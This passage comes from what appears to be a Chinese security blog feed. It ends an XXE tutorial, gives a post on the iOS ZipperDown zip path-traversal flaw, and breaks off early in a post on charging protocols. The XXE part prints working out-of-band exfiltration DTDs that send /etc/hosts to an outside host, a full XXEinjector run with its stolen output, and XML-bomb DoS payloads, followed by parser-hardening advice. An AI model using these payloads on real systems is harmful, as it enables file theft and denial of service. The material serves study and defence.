所以将其转成html实体编码</p><p><strong>上述过程分析</strong>：</p><p>首先 %remote; 加载 外部 DTD 文件，得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/hosts&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send system &apos;http://192.168.1.17:80/?p=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>%int;%send;<br>接着 %int; 获取对应实体的值，因为值中包含实体引用 %file;, 即 /etc/hosts 文件的内容，得到:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY &amp;#37; send system &apos;http://192.168.1.17:80/?p=[文件内容]&apos;&gt;</span><br><span class="line"></span><br><span class="line">%send;</span><br></pre></td></tr></table></figure></p><p>最后 %send; 获取对应实体的值，会去请求对应 URL 的资源，通过查看访问日志即可得到文件内容，当然这里还需要对内容进行编码，防止XML解析出错.</p><p>XXEinjector比较成熟的工具（<a href="https://github.com/enjoiz/XXEinjector）" target="_blank" rel="noopener">https://github.com/enjoiz/XXEinjector）</a></p><h3 id="XXEinjector"><a href="#XXEinjector" class="headerlink" title="XXEinjector"></a>XXEinjector</h3><p>使用 burp 获取原始正常的请求<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -d @xml.txt http://192.168.1.28/xmlinject.php --proxy http://127.0.0.1:8081</span><br></pre></td></tr></table></figure></p><p>xml.txt 内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;creds&gt;</span><br><span class="line">    &lt;user&gt;Ed&lt;/user&gt;</span><br><span class="line">    &lt;pass&gt;mypass&lt;/pass&gt;</span><br><span class="line">&lt;/creds&gt;</span><br><span class="line">burp中获取到的请求信息</span><br><span class="line"></span><br><span class="line">POST /xmlinject.php HTTP/1.1</span><br><span class="line">Host: 192.168.1.28</span><br><span class="line">User-Agent: curl/7.43.0</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Length: 57</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">&lt;creds&gt;</span><br><span class="line">  &lt;user&gt;Ed&lt;/user&gt;</span><br><span class="line">  &lt;pass&gt;mypass&lt;/pass&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure></p><p>在需要注入 DTD 的地方加入 XXEINJECT，然后保存到 phprequest.txt，XXEinjector 需要根据原始请求来进行获取文件内容的操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /xmlinject.php HTTP/1.1</span><br><span class="line">Host: 192.168.1.28</span><br><span class="line">User-Agent: curl/7.43.0</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Length: 57</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">XXEINJECT</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">  &lt;user&gt;Ed&lt;/user&gt;</span><br><span class="line">  &lt;pass&gt;mypass&lt;/pass&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure></p><p>运行 XXEinjector<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ruby XXEinjector.rb --host=192.168.1.17 --path=/etc/hosts --file=phprequest.txt  --proxy=127.0.0.1:8081 --oob=http --verbose --phpfilter</span><br></pre></td></tr></table></figure></p><p>参数说明<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">host: 用于反向连接的 IP</span><br><span class="line">path: 要读取的文件或目录</span><br><span class="line">file: 原始有效的请求信息，可以使用 XXEINJECT 来指出 DTD 要注入的位置</span><br><span class="line">proxy: 代理服务器，这里使用burp，方便查看发起的请求和响应</span><br><span class="line">oob：使用的协议，支持 http/ftp/gopher，这里使用http</span><br><span class="line">phpfilter：使用 PHP filter 对要读取的内容进行 base64 编码，解决传输文件内容时的编码问题</span><br></pre></td></tr></table></figure></p><p>运行后会输出 payload 和 引用的 DTD 文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">XXEinjector git:(master) sudo ruby XXEinjector.rb --host=192.168.1.17 --path=/etc/hosts --file=phprequest.txt  --proxy=127.0.0.1:8081 --oob=http --verbose --phpfilter</span><br><span class="line">Password:</span><br><span class="line">XXEinjector by Jakub Pałaczyński</span><br><span class="line"></span><br><span class="line">DTD injected.</span><br><span class="line">Enumeration locked.</span><br><span class="line">Sending request with malicious XML:</span><br><span class="line">http://192.168.1.28:80/xmlinject.php</span><br><span class="line">&#123;&quot;User-Agent&quot;=&gt;&quot;curl/7.43.0&quot;, &quot;Accept&quot;=&gt;&quot;*/*&quot;, &quot;Content-Length&quot;=&gt;&quot;159&quot;, &quot;Content-Type&quot;=&gt;&quot;application/x-www-form-urlencoded&quot;&#125;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://192.168.1.17:80/file.dtd&quot;&gt;%remote;%int;%trick;]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">  &lt;user&gt;Ed&lt;/user&gt;</span><br><span class="line">  &lt;pass&gt;mypass&lt;/pass&gt;</span><br><span class="line">&lt;/creds&gt;</span><br><span class="line"></span><br><span class="line">Got request for XML:</span><br><span class="line">GET /file.dtd HTTP/1.0</span><br><span class="line"></span><br><span class="line">Responding with XML for: /etc/hosts</span><br><span class="line">XML payload sent:</span><br><span class="line">&lt;!ENTITY % payl SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///etc/hosts&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; trick SYSTEM &apos;http://192.168.1.17:80/?p=%payl;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>payload为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://192.168.1.17:80/file.dtd&quot;&gt;%remote;%int;%trick;]&gt;</span><br></pre></td></tr></table></figure></p><p>DTD文件为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % payl SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///etc/hosts&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; trick SYSTEM &apos;http://192.168.1.17:80/?p=%payl;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>成功获取到文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Response with file/directory content received:</span><br><span class="line">GET /?p=MTI3LjAuMC4xCWxvY2FsaG9zdAoxMjcuMC4xLjEJa2FsaQoKIyBUaGUgZm9sbG93aW5nIGxpbmVzIGFyZSBkZXNpcmFibGUgZm9yIElQdjYgY2FwYWJsZSBob3N0cwo6OjEgICAgIGxvY2FsaG9zdCBpcDYtbG9jYWxob3N0IGlwNi1sb29wYmFjawpmZjAyOjoxIGlwNi1hbGxub2RlcwpmZjAyOjoyIGlwNi1hbGxyb3V0ZXJzCg== HTTP/1.0</span><br><span class="line"></span><br><span class="line">Enumeration unlocked.</span><br><span class="line">Successfully logged file: /etc/hosts</span><br></pre></td></tr></table></figure></p><p>在Logs目录下有详细的数据。</p><h3 id="XXE漏洞利用"><a href="#XXE漏洞利用" class="headerlink" title="XXE漏洞利用"></a>XXE漏洞利用</h3><h4 id="1-窃取文件"><a href="#1-窃取文件" class="headerlink" title="1.窃取文件"></a>1.窃取文件</h4><p><img src="/images/pasted-62.png" alt="upload successful"></p><p><img src="/images/pasted-63.png" alt="upload successful"></p><p>有些XML解析库支持列目录，攻击者通过列目录、读文件，获取帐号密码后进一步攻击</p><h4 id="2-RCE（配合其他问题）"><a href="#2-RCE（配合其他问题）" class="headerlink" title="2.RCE（配合其他问题）"></a>2.RCE（配合其他问题）</h4><p><img src="/images/pasted-64.png" alt="upload successful"></p><p><img src="/images/pasted-65.png" alt="upload successful"></p><p>安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。</p><h4 id="3-内网渗透"><a href="#3-内网渗透" class="headerlink" title="3.内网渗透"></a>3.内网渗透</h4><p>端口探测，内网请求等</p><p><img src="/images/pasted-66.png" alt="upload successful"></p><p><img src="/images/pasted-67.png" alt="upload successful"></p><h3 id="XXE案例"><a href="#XXE案例" class="headerlink" title="XXE案例"></a>XXE案例</h3><h4 id="1-微信支付SDK"><a href="#1-微信支付SDK" class="headerlink" title="1.微信支付SDK"></a>1.微信支付SDK</h4><p>参考：<a href="http://seclists.org/fulldisclosure/2018/Jul/3" target="_blank" rel="noopener">http://seclists.org/fulldisclosure/2018/Jul/3</a></p><p>反例：<a href="https://my.oschina.net/kmwzjs/blog/608501?fromerr=DzDfNIhd" target="_blank" rel="noopener">https://my.oschina.net/kmwzjs/blog/608501?fromerr=DzDfNIhd</a></p><h4 id="2-apktool-xxe漏洞"><a href="#2-apktool-xxe漏洞" class="headerlink" title="2.apktool xxe漏洞"></a>2.apktool xxe漏洞</h4><p>参考：<a href="https://security.tencent.com/index.php/blog/msg/122" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/122</a></p><h4 id="3-绕过技巧"><a href="#3-绕过技巧" class="headerlink" title="3.绕过技巧"></a>3.绕过技巧</h4><p><img src="/images/pasted-71.png" alt="upload successful"></p><h3 id="XML其他类型漏洞"><a href="#XML其他类型漏洞" class="headerlink" title="XML其他类型漏洞"></a>XML其他类型漏洞</h3><h4 id="1-DoS"><a href="#1-DoS" class="headerlink" title="1. DoS"></a>1. DoS</h4><ul><li><p>a和b递归调用<br><img src="/images/pasted-70.png" alt="upload successful"></p></li><li><p>xml炸弹(Billion Laughs Attack)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE lolz [</span><br><span class="line">&lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure></li><li><p>xml炸弹（Reference a large file）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">&lt;!ENTITY dos SYSTEM &quot;http:///somesite.com/largefile.xml&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;&amp;dos;&lt;/data&gt;</span><br></pre></td></tr></table></figure></li></ul><h1 id="四、防御"><a href="#四、防御" class="headerlink" title="四、防御"></a>四、防御</h1><h2 id="1-使用开发语言提供的禁用外部实体的方法"><a href="#1-使用开发语言提供的禁用外部实体的方法" class="headerlink" title="1.使用开发语言提供的禁用外部实体的方法"></a>1.<strong>使用开发语言提供的禁用外部实体的方法</strong></h2><p>PHP：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(true);</span><br></pre></td></tr></table></figure></p><p>JAVA:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br></pre></td></tr></table></figure></p><p>Python：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</span><br></pre></td></tr></table></figure></p><h2 id="2-过滤用户提交的XML数据"><a href="#2-过滤用户提交的XML数据" class="headerlink" title="2.过滤用户提交的XML数据"></a>2.<strong>过滤用户提交的XML数据</strong></h2><p>过滤关键词：DOCTYPE和ENTITY，或者SYSTEM和PUBLIC。</p><h1 id="五、Android上的XXE"><a href="#五、Android上的XXE" class="headerlink" title="五、Android上的XXE?"></a>五、Android上的XXE?</h1><h2 id="1-DocumentBuilderFactory"><a href="#1-DocumentBuilderFactory" class="headerlink" title="1.DocumentBuilderFactory"></a>1.DocumentBuilderFactory</h2><p>在java中默认允许加载外部实体，DocumentBuilderFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING,true)之后不会加载外部实体。但同样代码在Android上默认不允许加载，setFeature强制设为false失败。</p><p>官方文档中明确说明可以设置FEATURE_SECURE_PROCESSING，但实际代码不可以</p><p>参考：<br>官方文档<br><a href="https://developer.android.com/reference/javax/xml/parsers/DocumentBuilderFactory#setFeature(java.lang.String,boolean" target="_blank" rel="noopener">https://developer.android.com/reference/javax/xml/parsers/DocumentBuilderFactory#setFeature(java.lang.String,boolean</a>)<br>实际代码：<br><a href="https://android.googlesource.com/platform/libcore/+/master/luni/src/main/java/org/apache/harmony/xml/parsers/DocumentBuilderFactoryImpl.java#90" target="_blank" rel="noopener">https://android.googlesource.com/platform/libcore/+/master/luni/src/main/java/org/apache/harmony/xml/parsers/DocumentBuilderFactoryImpl.java#90</a></p><h2 id="2-XmlPullParser"><a href="#2-XmlPullParser" class="headerlink" title="2.XmlPullParser"></a>2.XmlPullParser</h2><p>XmlPullParser是官方文档推荐的xml解析工具，但Android 代码中禁止了外部实体。</p><p>早期的KxmlParser和ExpatPullParser是Android早期的xml解析包，后来进行了改动，和XmlPullParser本质上调用的同一套代码。</p><p>通过跟踪XmlPullParserFactory发现其最终调用的KXmlParser来解析，（<a href="http://androidxref.com/7.1.2_r36/xref/libcore/xml/src/main/java/org/kxml2/io/KXmlParser.java#925），而KXmlParser对于带SYSTEM和PUBLIC两种形式的实体强制置为了empty" target="_blank" rel="noopener">http://androidxref.com/7.1.2_r36/xref/libcore/xml/src/main/java/org/kxml2/io/KXmlParser.java#925），而KXmlParser对于带SYSTEM和PUBLIC两种形式的实体强制置为了empty</a> string。</p><p><img src="/images/pasted-74.png" alt="upload successful"></p><p><img src="/images/pasted-68.png" alt="upload successful"></p><p><img src="/images/pasted-73.png" alt="upload successful"></p><p>参考：<a href="https://android.googlesource.com/platform/libcore-snapshot/+/ics-mr1/luni/src/test/java/libcore/xml/PullParserDtdTest.java" target="_blank" rel="noopener">https://android.googlesource.com/platform/libcore-snapshot/+/ics-mr1/luni/src/test/java/libcore/xml/PullParserDtdTest.java</a></p><p><a href="http://androidxref.com/7.1.2_r36/xref/libcore/xml/src/main/java/org/xmlpull/v1/XmlPullParser.java" target="_blank" rel="noopener">http://androidxref.com/7.1.2_r36/xref/libcore/xml/src/main/java/org/xmlpull/v1/XmlPullParser.java</a></p><h2 id="3-SAXParserFactory"><a href="#3-SAXParserFactory" class="headerlink" title="3. SAXParserFactory"></a>3. SAXParserFactory</h2><p>不支持参数实体</p><h1 id="Hint"><a href="#Hint" class="headerlink" title="Hint"></a>Hint</h1><ul><li>Android不存在XXE? Bypass?</li><li>XXE多存在于PC平台，开发者并不知情，默认开启的最严重</li><li>APP中的xml流量？Burpsuit Fuzz ？</li></ul><p>参考文档</p><ol><li><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/69</a></li><li><a href="https://thief.one/2017/06/20/1/" target="_blank" rel="noopener">https://thief.one/2017/06/20/1/</a></li><li><a href="https://b1ngz.github.io/XXE-learning-note/" target="_blank" rel="noopener">https://b1ngz.github.io/XXE-learning-note/</a></li><li>全平台的xml漏洞分析 <a href="https://www.usenix.org/system/files/conference/woot16/woot16-paper-spath.pdf" target="_blank" rel="noopener">https://www.usenix.org/system/files/conference/woot16/woot16-paper-spath.pdf</a></li><li>android解析XML总结（SAX、Pull、Dom三种方式） <a href="http://www.cnblogs.com/JerryWang1991/archive/2012/02/24/2365507.html" target="_blank" rel="noopener">http://www.cnblogs.com/JerryWang1991/archive/2012/02/24/2365507.html</a></li><li>XML External Entity (XXE) Prevention Cheat Sheet <a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet#XMLReader" target="_blank" rel="noopener">https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet#XMLReader</a></li></ol>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>iOS应用安全 —— ZipperDown漏洞</title>
      <link href="/2018/07/01/iOS%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8-%E2%80%94%E2%80%94-ZipperDown/"/>
      <url>/2018/07/01/iOS%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8-%E2%80%94%E2%80%94-ZipperDown/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>ZipperDown是盘古实验室公布的一个由目录穿越导致RCE的漏洞，根据盘古的检测，发现约10%的iOS应用可能受此漏洞的影响。经过手工分析，确认微博、陌陌、网易云音乐、QQ音乐、快手等流行应用受影响。</p><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><ul><li>iOS平台没有提供官方解压类库，所以开发中往往引用第三方库来实现解压功能；</li><li>由于现有的iOS App基本上采用SSZipArchive或Ziparchive来实现解压，因此漏洞是来自使用第三方Zip库解压Zip文件的过程中没有对Zip内文件名做校验导致的；</li><li>例如 SSZipArchive解压时会吧文件名直接拼接到目标路径后面，如果文件名中含有“../”则可以实现目录的上一级跳转，从而实现应用内任意目录的跳转，进一步可以实现文件覆盖；</li><li>如果把App的热修复hotpatch文件覆盖替换了，可以达到执行黑客指定指令，从而按照黑客的意图实现任意应用内攻击。</li></ul><h1 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h1><ul><li>使用了SSZipArchive或Ziparchive第三方解压库;</li><li>Zip包在解压时没有做完整性校验;</li><li>文件名中包含../等路径特殊符号，解压时没有对文件名过滤处理;</li><li>使用了JSPatch或其他热修复库，且本地脚本没有加密等安全处理;</li><li>连接不可靠的WIFI热点或者网络被人劫持。</li></ul><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>iOS平台的两个解压缩库（SSZipArchive和ZipArchive）在解压缩过程中没有考虑到文件名中包含”../”的情况，造成了文件释放过程中路径穿越，导致恶意Zip文件可以在App沙盒范围内，覆盖任意可写文件。具体代码如下：</p><p><strong>ZipArchive相关代码</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">-(BOOL) UnzipFileTo:(NSString*) path overWrite:(BOOL) overwrite</span><br><span class="line">&#123;</span><br><span class="line">    [...]</span><br><span class="line">    // check if it contains directory</span><br><span class="line">    NSString* strPath = [NSString stringWithCString:filename encoding:NSUTF8StringEncoding];</span><br><span class="line">    BOOL isDirectory = NO;</span><br><span class="line">    if( filename[fileInfo.size_filename-1]==&apos;/&apos; || filename[fileInfo.size_filename-1]==&apos;\\&apos;)</span><br><span class="line">        isDirectory = YES;</span><br><span class="line">    free( filename );</span><br><span class="line">    if( [strPath rangeOfCharacterFromSet:[NSCharacterSetcharacterSetWithCharactersInString:@&quot;/\\&quot;]].location!=NSNotFound )</span><br><span class="line">    &#123;</span><br><span class="line">        // contains a path</span><br><span class="line">        strPath = [strPath stringByReplacingOccurrencesOfString:@&quot;\\&quot; withString:@&quot;/&quot;];</span><br><span class="line">    &#125;</span><br><span class="line">    NSString* fullPath = [path stringByAppendingPathComponent:strPath];</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>SSZipArchive相关代码</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">+ (BOOL)unzipFileAtPath:(NSString *)path</span><br><span class="line">          toDestination:(NSString *)destination</span><br><span class="line">     preserveAttributes:(BOOL)preserveAttributes</span><br><span class="line">              overwrite:(BOOL)overwrite</span><br><span class="line">         nestedZipLevel:(NSInteger)nestedZipLevel</span><br><span class="line">               password:(nullable NSString *)password</span><br><span class="line">                  error:(NSError **)error</span><br><span class="line">               delegate:(nullable id)delegate</span><br><span class="line">        progressHandler:(void (^_Nullable)(NSString *entry, unz_file_info zipInfo, long entryNumber, long total))progressHandler</span><br><span class="line">      completionHandler:(void (^_Nullable)(NSString *path, BOOL succeeded, NSError * _Nullable error))completionHandler&#123;</span><br><span class="line">    [...]</span><br><span class="line">    if ([strPath rangeOfCharacterFromSet:[NSCharacterSetcharacterSetWithCharactersInString:@&quot;/\\&quot;]].location != NSNotFound) &#123;</span><br><span class="line">    strPath = [strPath stringByReplacingOccurrencesOfString:@&quot;\\&quot; withString:@&quot;/&quot;];</span><br><span class="line">    &#125;          </span><br><span class="line">    NSString *fullPath = [destination stringByAppendingPathComponent:strPath];</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>基于以上漏洞原理，漏洞利用条件的核心即如何使目标App解压不可信Zip文件，iOS应用的主要解压场景如下：</p><ol><li>App直接接收不可信Zip文件，并使用SSZipArchive/ZipArchive（或其它存在路径穿越问题的代码）解压。例如聊天应用、文件管理应用中可能存在这类业务场景。</li><li>App通过HTTP下载Zip文件，使用SSZipArchive/ZipArchive（或其它存在路径穿越问题的代码）解压。在这种场景下，攻击者可以通过流量劫持等途径，将正常Zip文件替换为恶意Zip文件，在App中实现文件覆盖。</li></ol><p>完成文件覆盖后，一些特殊场景可以实现RCE,例如：</p><ol><li>覆盖了热补丁文件，APP加载恶意热补丁实现RCE</li><li>覆盖了APP的核心文件，实现钓鱼、拒绝服务等</li></ol><p>先前的微信、企业微信等都是因为存在ZipperDown问题，导致最后账户被克隆。</p><p>另外，由于iOS沙盒保护，ZipperDown的破坏范围仅限在App环境中。</p><p>参考资料：</p><ol><li>ZipperDown  <a href="https://zipperdown.org/" target="_blank" rel="noopener">https://zipperdown.org/</a></li><li><a href="https://github.com/muzipiao/ZipperDownDemo" target="_blank" rel="noopener">https://github.com/muzipiao/ZipperDownDemo</a></li></ol>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>关于手机充电器 - 充电协议</title>
      <link href="/2018/06/27/%E5%85%B3%E4%BA%8E%E6%89%8B%E6%9C%BA%E5%85%85%E7%94%B5%E5%99%A8/"/>
      <url>/2018/06/27/%E5%85%B3%E4%BA%8E%E6%89%8B%E6%9C%BA%E5%85%85%E7%94%B5%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>目前市面上充斥着各种诸如“充电1分钟，通话2小时”的宣传，手机快速充电成为手机厂商们追逐的一个技术指标。常见的标准充电装置通常为5V/1A 或 5V/2A，快速充电意味着要在电流或电压上有所提高，于是就出现了如QC、PD等各式各样的充电协议，本文作一个简单介绍。</p><p>几个关键知识点：</p><ul><li>MicroUSB最大支持电流为2A,TYPE-C口最多支持5A</li><li>PD协议是谷歌和USB-IF推出的，QC是高通推出的</li><li>PD 3.0收编了QC 4.0,PD可能会成为主流,谷歌已经强制安卓阵营使用USB接口就必须支持PD协议</li><li>所有用来充电的type-c接口都支持pd2.0协议吗？并不是，type-c只是接口形状，支持的协议各不相同。</li></ul><h2 id="充电要考虑的问题"><a href="#充电要考虑的问题" class="headerlink" title="充电要考虑的问题"></a>充电要考虑的问题</h2><h3 id="一、电池的接受能力"><a href="#一、电池的接受能力" class="headerlink" title="一、电池的接受能力"></a>一、电池的接受能力</h3><p>充电本质上就是“喂饱电池”，目前市面上比较流行的iphone x，华为P9，小米note等，电池容量都不超过3000mAH，按照4.35V作为最高电压，1.5C（C为充电或放电倍率，对于3000mAh的电池1.5C电流就是4500mA）充电来看，最大可能接受的充电功率约为20W（4.35V*4.5A约等于20W），当然，这是极限情况。除了功率接收能力，还要涉及到电流接受能力。在1.5C充电时，3000mAH的电池充电电流将达到4.5A，因此，电池触点和电芯内部的电流传输结构都要进行必要的优化。</p><h3 id="二、适配器的功率提供能力"><a href="#二、适配器的功率提供能力" class="headerlink" 